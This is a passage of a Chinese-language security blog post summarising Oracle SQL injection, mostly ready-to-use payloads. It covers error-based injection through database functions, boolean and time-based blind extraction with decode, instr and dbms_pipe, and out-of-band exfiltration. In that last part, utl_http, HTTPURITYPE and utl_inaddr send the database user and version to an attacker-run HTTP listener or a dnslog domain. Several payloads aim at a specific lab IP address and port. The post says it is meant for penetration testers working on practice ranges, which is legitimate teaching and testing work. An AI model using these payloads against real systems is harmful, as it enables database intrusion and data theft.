<h2 id="4、bms-xdb-version-makeversioned"><a href="#4、bms-xdb-version-makeversioned" class="headerlink" title="4、bms_xdb_version.makeversioned()"></a>4、bms_xdb_version.makeversioned()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#获取当前数据库用户 ORACLE1</span><br><span class="line">?id=1 and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null --</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627371068298-bf405b32-0774-4999-b59c-5f972ff993eb.png#align=left&display=inline&height=299&margin=%5Bobject%2Object%5D&name=image.png&originHeight=598&originWidth=2500&size=157266&status=done&style=none&width=1250" alt="image.png"></p>
<h2 id="5、dbms-xdb-version-uncheckout"><a href="#5、dbms-xdb-version-uncheckout" class="headerlink" title="5、dbms_xdb_version.uncheckout()"></a>5、dbms_xdb_version.uncheckout()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#获取数据库版本信息</span><br><span class="line">?id=1 and (select dbms_xdb_version.uncheckout((select banner from sys.v_$version where rownum=1)) from dual) is not null --</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627371151615-1dc8551d-bb05-4b01-ab12-fb20b684f7b1.png#align=left&display=inline&height=305&margin=%5Bobject%2Object%5D&name=image.png&originHeight=610&originWidth=2464&size=184586&status=done&style=none&width=1232" alt="image.png"></p>
<h2 id="6、dbms-utility-sqlid-to-sqlhash"><a href="#6、dbms-utility-sqlid-to-sqlhash" class="headerlink" title="6、dbms_utility.sqlid_to_sqlhash()"></a>6、dbms_utility.sqlid_to_sqlhash()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#获取数据库版本信息</span><br><span class="line">?id=1 and (SELECT dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1)) from dual) is not null --</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627371240951-badc7016-575d-4a23-9d5b-24d99923c150.png#align=left&display=inline&height=306&margin=%5Bobject%2Object%5D&name=image.png&originHeight=612&originWidth=2500&size=190889&status=done&style=none&width=1250" alt="image.png"></p>
<h2 id="7、ordsys-ord-dicom-getmappingxpath"><a href="#7、ordsys-ord-dicom-getmappingxpath" class="headerlink" title="7、ordsys.ord_dicom.getmappingxpath()"></a>7、ordsys.ord_dicom.getmappingxpath()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=ordsys.ord_dicom.getmappingxpath((select banner from sys.v_$version where rownum=1),user,user)--</span><br></pre></td></tr></table></figure>
<h2 id="8、utl-inaddr"><a href="#8、utl-inaddr" class="headerlink" title="8、utl_inaddr.*()"></a>8、utl_inaddr.*()</h2><p>utl_inaddr（用于取得局域网或Internet环境中的主机名和IP地址）<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627369182388-db5976e4-c62c-460c-a76e-4a3b9fdadf0e.png#align=left&display=inline&height=444&margin=%5Bobject%2Object%5D&name=image.png&originHeight=888&originWidth=1480&size=138926&status=done&style=none&width=740" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=utl_inaddr.get_host_name((select user from dual)) --</span><br><span class="line">?id=1 and 1=utl_inaddr.get_host_address((select user from dual)) --</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464133762-13bb4b59-3f8f-466a-b970-082352b0484e.png#align=left&display=inline&height=398&margin=%5Bobject%2Object%5D&name=image.png&originHeight=796&originWidth=1692&size=57659&status=done&style=none&width=846" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464181708-702fd815-478b-488f-8c3a-565adb5fb2f4.png#align=left&display=inline&height=458&margin=%5Bobject%2Object%5D&name=image.png&originHeight=916&originWidth=1810&size=65997&status=done&style=none&width=905" alt="image.png"></p>
<h1 id="0x05-布尔型盲注"><a href="#0x05-布尔型盲注" class="headerlink" title="0x05 布尔型盲注"></a>0x05 布尔型盲注</h1><p>常用猜解：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#猜长度</span><br><span class="line">?id=1 and 6=(select length(user) from dual)--</span><br><span class="line">#截取值猜ascii码</span><br><span class="line">?id=1 and (select ascii(substr(user,1,1)) from dual)&gt;83</span><br><span class="line">?id=1 and (select ascii(substr(user,1,1)) from dual)=83</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627358275597-570e4d7d-7594-4570-bd79-ff983c61706e.png#align=left&display=inline&height=380&margin=%5Bobject%2Object%5D&name=image.png&originHeight=760&originWidth=2404&size=187790&status=done&style=none&width=1202" alt="image.png"></p>
<h2 id="1、decode函数布尔盲注"><a href="#1、decode函数布尔盲注" class="headerlink" title="1、decode函数布尔盲注"></a>1、decode函数布尔盲注</h2><p>decode(字段或字段的运算，值1，值2，值3）<br>这个函数运行的结果是，当字段或字段的运算的值等于值1时，该函数返回值2，否则返回3</p>
<h3 id="测试用户名长度"><a href="#测试用户名长度" class="headerlink" title="测试用户名长度"></a>测试用户名长度</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:44768/new_list.php?id=1 and 6=(select length(user) from dual) --</span><br></pre></td></tr></table></figure>
<h3 id="测试当前用户是否为SYSTEM"><a href="#测试当前用户是否为SYSTEM" class="headerlink" title="测试当前用户是否为SYSTEM"></a>测试当前用户是否为SYSTEM</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#如果是system用户则返回正常，不是则返回不正常</span><br><span class="line">http://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(user,&#x27;SYSTEM&#x27;,1,0) from dual) -- </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#使用substr截断，逐个字段进行猜解</span><br><span class="line">http://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,1,0) from dual) -- </span><br><span class="line">?id=1 and 1=(select decode(substr(user,2,1),&#x27;Y&#x27;,1,0) from dual) -- </span><br><span class="line">?id=1 and 1=(select decode(substr(user,3,1),&#x27;S&#x27;,1,0) from dual) --</span><br><span class="line">?id=1 and 1=(select decode(substr(user,4,1),&#x27;T&#x27;,1,0) from dual) --</span><br><span class="line">?id=1 and 1=(select decode(substr(user,5,1),&#x27;E&#x27;,1,0) from dual) --</span><br><span class="line">?id=1 and 1=(select decode(substr(user,6,1),&#x27;M&#x27;,1,0) from dual) --</span><br><span class="line"></span><br><span class="line">#当然也可以配合ascii码进行猜解</span><br><span class="line">?id=1 and 1=(select decode(ascii(substr(user,1,1)),&#x27;83&#x27;,1,0) from dual) --</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627366490187-723fa9dc-c6d7-4858-a429-d98bbe77cab4.png#align=left&display=inline&height=436&margin=%5Bobject%2Object%5D&name=image.png&originHeight=872&originWidth=2424&size=197040&status=done&style=none&width=1212" alt="image.png"></p>
<h2 id="2、instr函数布尔盲注"><a href="#2、instr函数布尔盲注" class="headerlink" title="2、instr函数布尔盲注"></a>2、instr函数布尔盲注</h2><p>instr函数的应用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select instr(&#x27;abcdefgh&#x27;,&#x27;de&#x27;) position from dual;</span><br><span class="line">#返回结果：4</span><br></pre></td></tr></table></figure>
<p>盲注中的应用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:44768/new_list.php?id=1 and 1=(instr((select user from dual),&#x27;SYS&#x27;)) --</span><br><span class="line">?id=1 and 4=(instr((select user from dual),&#x27;T&#x27;)) --</span><br></pre></td></tr></table></figure>
<h1 id="0x06-延时盲注"><a href="#0x06-延时盲注" class="headerlink" title="0x06 延时盲注"></a>0x06 延时盲注</h1><h2 id="1、检测漏洞存在"><a href="#1、检测漏洞存在" class="headerlink" title="1、检测漏洞存在"></a>1、检测漏洞存在</h2><p>DBMS_PIPE.RECEIVE_MESSAGE函数的作用是从指定管道获取消息。<br>具体用法为：<strong>DBMS_PIPE.RECEIVE_MESSAGE(‘pipename’,timeout)</strong><br><strong>pipename</strong>为varchar(128)的字符串，用以指定管道名称，在这里我们输入任意值即可。<br><strong>timeout</strong>为integer的可选输入参数，用来指定等待时间。<br>常用payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:44768/new_list.php?id=1 and 1=dbms_pipe.receive_message(&#x27;o&#x27;, 10)--</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627365780661-fefb7bcc-e426-4014-8c09-9803fbb76335.png#align=left&display=inline&height=421&margin=%5Bobject%2Object%5D&name=image.png&originHeight=842&originWidth=2528&size=312249&status=done&style=none&width=1264" alt="image.png"><br>如果页面延时10秒返回，即存在注入。</p>
<h2 id="2、配合decode函数延时盲注"><a href="#2、配合decode函数延时盲注" class="headerlink" title="2、配合decode函数延时盲注"></a>2、配合decode函数延时盲注</h2><p>只需要将延时语句放入decode函数中即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#直接猜解字符</span><br><span class="line">?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,dbms_pipe.receive_message(&#x27;o&#x27;,5),0) from dual) --</span><br><span class="line"></span><br><span class="line">#通过ascii猜解字符</span><br><span class="line">?id=1 and 1=(select decode(ascii(substr(user,1,1)),&#x27;83&#x27;,dbms_pipe.receive_message(&#x27;o&#x27;,5),0) from dual) --</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627366016814-7d8cdee4-c932-4907-87e0-017ae7f6296f.png#align=left&display=inline&height=506&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1012&originWidth=2146&size=293305&status=done&style=none&width=1073" alt="image.png"></p>
<h2 id="3、使用其他延时查询来判断"><a href="#3、使用其他延时查询来判断" class="headerlink" title="3、使用其他延时查询来判断"></a>3、使用其他延时查询来判断</h2><p>如(select count(*) from all_objects) ，因为查询结果需要一定的时间，在无法使用dbms_pipe.receive_message()函数的情况下可以使用这个。具体操作只需要将decode()函数的返回结果进行替换即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#直接猜解字符</span><br><span class="line">?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,(select count(*) from all_objects),0) from dual) --</span><br><span class="line"></span><br><span class="line">#通过ascii猜解字符</span><br><span class="line">?id=1 and 1=(select decode(ascii(substr(user,1,1)),&#x27;83&#x27;,(select count(*) from all_objects),0) from dual) --</span><br></pre></td></tr></table></figure>
<h1 id="0x07-外带数据注入"><a href="#0x07-外带数据注入" class="headerlink" title="0x07 外带数据注入"></a>0x07 外带数据注入</h1><h2 id="1、url-http-request"><a href="#1、url-http-request" class="headerlink" title="1、url_http.request()"></a>1、url_http.request()</h2><p>使用此方法，用户需要有utl_http访问网络的权限<br>首先检测是否支持，页面返回正常则表示支持</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and exists (select count(*) from all_objects where object_name=&#x27;UTL_HTTP&#x27;) --</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464342525-e4cd81f2-77a8-4a90-ace7-36aa714ccdaa.png#align=left&display=inline&height=369&margin=%5Bobject%2Object%5D&name=image.png&originHeight=738&originWidth=1854&size=42432&status=done&style=none&width=927" alt="image.png"><br>然后python起一个http服务，或者开启nc监听。这里我使用python开启一个服务：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 4455</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464776325-cd84daca-3f18-48a5-86a3-9a92df1fdd05.png#align=left&display=inline&height=145&margin=%5Bobject%2Object%5D&name=image.png&originHeight=290&originWidth=1144&size=47561&status=done&style=none&width=572" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#子查询数据库版本信息并访问python起的http服务</span><br><span class="line">?id=1 and utl_http.request(&#x27;http://192.168.100.130:4455/&#x27;||(select banner from sys.v_$version where rownum=1))=1--</span><br><span class="line"></span><br><span class="line">#http访问时可以将||进行URL编码</span><br><span class="line">?id=1 and utl_http.request(&#x27;http://192.168.100.130:4455/&#x27;%7C%7C(select banner from sys.v_$version where rownum=1))=1--</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464897258-175be638-08f8-4355-8ce8-e2552bfdd355.png#align=left&display=inline&height=372&margin=%5Bobject%2Object%5D&name=image.png&originHeight=744&originWidth=1868&size=59899&status=done&style=none&width=934" alt="image.png"><br>可以看到成功获取了数据<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464921197-61542222-97e4-4941-b1d9-ca5bdcec6fe2.png#align=left&display=inline&height=234&margin=%5Bobject%2Object%5D&name=image.png&originHeight=468&originWidth=1454&size=124719&status=done&style=none&width=727" alt="image.png"></p>
<h2 id="2、utl-inaddr-get-host-address-函数"><a href="#2、utl-inaddr-get-host-address-函数" class="headerlink" title="2、utl_inaddr.get_host_address()函数"></a>2、utl_inaddr.get_host_address()函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#使用dnslog外带数据</span><br><span class="line">?id=1 and (select utl_inaddr.get_host_address((select user from dual)||&#x27;.eeaijt.dnslog.cn&#x27;) from dual)is not null --</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627465955162-98de91a3-8382-4073-bcf3-18728762e3f1.png#align=left&display=inline&height=343&margin=%5Bobject%2Object%5D&name=image.png&originHeight=686&originWidth=1664&size=42677&status=done&style=none&width=832" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627465968725-e5b0236e-0e8d-4aa2-8556-eb6fbf6e935f.png#align=left&display=inline&height=283&margin=%5Bobject%2Object%5D&name=image.png&originHeight=566&originWidth=1680&size=59996&status=done&style=none&width=840" alt="image.png"></p>
<h2 id="3、SYS-DBMS-LDAP-INIT-函数"><a href="#3、SYS-DBMS-LDAP-INIT-函数" class="headerlink" title="3、SYS.DBMS_LDAP.INIT()函数"></a>3、SYS.DBMS_LDAP.INIT()函数</h2><p>网上说是可以使用，我试着不行，收不到数据，不知道是不是环境问题。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select SYS.DBMS_LDAP.INIT((select user from dual)||&#x27;.51prg6.dnslog.cn&#x27;,80) from dual)is not null --</span><br><span class="line"></span><br><span class="line">?id=1 and (select DBMS_LDAP.INIT((select user from dual)||&#x27;.51prg6.dnslog.cn&#x27;,80) from dual)is not null --</span><br></pre></td></tr></table></figure>
<h2 id="4、HTTPURITYPE-函数"><a href="#4、HTTPURITYPE-函数" class="headerlink" title="4、HTTPURITYPE()函数"></a>4、HTTPURITYPE()函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select HTTPURITYPE(&#x27;http://192.168.100.130:4455/&#x27;||(select user from dual)).GETCLOB() FROM DUAL)is not null --</span><br></pre></td></tr></table></figure>
<p>同样需要python起一个http服务，或者nc创建监听<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627466748565-80964d64-450b-46fc-8f89-77bdb55ce3cd.png#align=left&display=inline&height=419&margin=%5Bobject%2Object%5D&name=image.png&originHeight=838&originWidth=1878&size=78666&status=done&style=none&width=939" alt="image.png"><br>虽然访问404，但是同样成功外带数据。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1627466760517-a4a23a26-b2d0-4ea8-96c9-3a7c5470b395.png#align=left&display=inline&height=230&margin=%5Bobject%2Object%5D&name=image.png&originHeight=460&originWidth=1454&size=97022&status=done&style=none&width=727" alt="image.png"></p>
<h1 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h1><p>Oracle数据库注入跟日常的注入其实没有什么太大的分别，需要注意数据类型的一致性和常用表名列名的不同即可，在sql注入的原理上都是拼接sql语句并执行。在实战中企业还是有很大部分使用Oracle数据库，故在此进行分析总结，希望能够对渗透测试人员有所帮助。<br>以上测试靶场采用墨者学院Oracle注入靶场、掌控安全Oralce注入靶场以及本地搭建的Oracle数据库，在实战中可能会遇到waf等安全设备的拦截，后续将针对Oracle数据库waf绕过编写一篇文章，敬请期待ing～</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">jasson</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://j-jasson2.github.io/2021/02/02/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">https://j-jasson2.github.io/2021/02/02/Oracle数据库注入总结/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://j-jasson2.github.io" target="_blank">jasson个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><a class="post-meta__tags" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a><a class="post-meta__tags" href="/tags/oracle/">oracle</a></div><div class="post_share"><div class="social-share" data-image="/images/oracle.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/02/02/MSSQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E5%85%A8%E6%96%B9%E4%BD%8D%E5%88%A9%E7%94%A8/"><img class="prev-cover" src="https://p5.ssl.qhimg.com/t0181df866952842a55.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">MSSQL数据库注入全方位利用</div></div></a></div><div class="next-post pull-right"><a href="/2020/12/11/%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BF%E4%B8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/"><img class="next-cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.pianshen.com%2Fimages%2F697%2F9a88f04ae145ad4377fff80669db0f11.png&amp;refer=http%3A%2F%2Fwww.pianshen.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630747539&amp;t=3e0837ebe761272f181318a65342fab2" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">通过文件包含拿下服务器</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/02/02/MSSQL数据库注入全方位利用/" title="MSSQL数据库注入全方位利用"><img class="cover" src="https://p5.ssl.qhimg.com/t0181df866952842a55.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-02</div><div class="title">MSSQL数据库注入全方位利用</div></div></a></div><div><a href="/2020/03/08/SQL注入全方位利用之显错注入/" title="SQL注入全方位利用之显错注入"><img class="cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.shangdixinxi.com%2Fup%2Finfo%2F202006%2F20200604170532028792.png&refer=http%3A%2F%2Fimg.shangdixinxi.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630916300&t=5efb5b64bc17ac6be7c880a5fa3db56b" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-08</div><div class="title">SQL注入全方位利用之显错注入</div></div></a></div><div><a href="/2020/03/02/实例挖掘sql注入显错注入漏洞/" title="花几分钟找个上市公司的SQL注入漏洞"><img class="cover" src="/images/pasted-36.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-02</div><div class="title">花几分钟找个上市公司的SQL注入漏洞</div></div></a></div><div><a href="/2020/05/01/极易上手的报错注入/" title="极易上手的报错注入"><img class="cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg2018.cnblogs.com%2Fblog%2F1579399%2F201907%2F1579399-20190717003510359-570355042.png&refer=http%3A%2F%2Fimg2018.cnblogs.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630916535&t=757f4c39d3a5884249a1291b70cde3b7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-01</div><div class="title">极易上手的报错注入</div></div></a></div><div><a href="/2020/09/02/sql注入之重新学习/" title="sql注入之重新学习"><img class="cover" src="/images/sql.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-02</div><div class="title">sql注入之重新学习</div></div></a></div><div><a href="/2021/08/01/Oracle数据库注入环境搭建/" title="Oracle数据库注入环境搭建"><img class="cover" src="https://img0.baidu.com/it/u=3845303080,3279446310&fm=26&fmt=auto&gp=0.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-01</div><div class="title">Oracle数据库注入环境搭建</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_match%2F0%2F12039801160%2F0.jpg&amp;refer=http%3A%2F%2Finews.gtimg.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630728108&amp;t=1576409e5f212dd7279b9a1c880c7086" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">jasson</div><div class="author-info__description">专注于Web、内网渗透、红蓝攻防、代码审计，分享知识，分享生活。</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">57</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/j-jasson2"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%B3%A8%E5%85%A5%E7%82%B9%E7%A1%AE%E5%AE%9A"><span class="toc-number">2.</span> <span class="toc-text">0x02 注入点确定</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">0x03 显错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0%E4%B8%BA2"><span class="toc-number">3.1.</span> <span class="toc-text">1、判断字段数为2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E8%8E%B7%E5%8F%96%E6%98%BE%E9%94%99%E7%82%B9"><span class="toc-number">3.2.</span> <span class="toc-text">2、获取显错点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">3.3.</span> <span class="toc-text">3、查询数据库版本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E7%94%A8%E6%88%B7"><span class="toc-number">3.4.</span> <span class="toc-text">4、获取当前数据库连接用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%93%E5%90%8D"><span class="toc-number">3.5.</span> <span class="toc-text">5、查询当前数据库库名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%90%8D"><span class="toc-number">3.6.</span> <span class="toc-text">6、查询数据库表名</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.6.1.</span> <span class="toc-text">直接查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E7%B3%8A%E6%90%9C%E7%B4%A2%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.6.2.</span> <span class="toc-text">模糊搜索查询</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%97%E5%90%8D"><span class="toc-number">3.7.</span> <span class="toc-text">7、查询数据库列名</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E6%9F%A5%E8%AF%A2-1"><span class="toc-number">3.7.1.</span> <span class="toc-text">直接查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E7%B3%8A%E6%90%9C%E7%B4%A2%E6%9F%A5%E8%AF%A2-1"><span class="toc-number">3.7.2.</span> <span class="toc-text">模糊搜索查询</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E3%80%81%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE"><span class="toc-number">3.8.</span> <span class="toc-text">8、查询数据库数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9%E3%80%81%E7%BE%8E%E5%8C%96%E8%BE%93%E5%87%BA"><span class="toc-number">3.9.</span> <span class="toc-text">9、美化输出</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">0x04 报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a 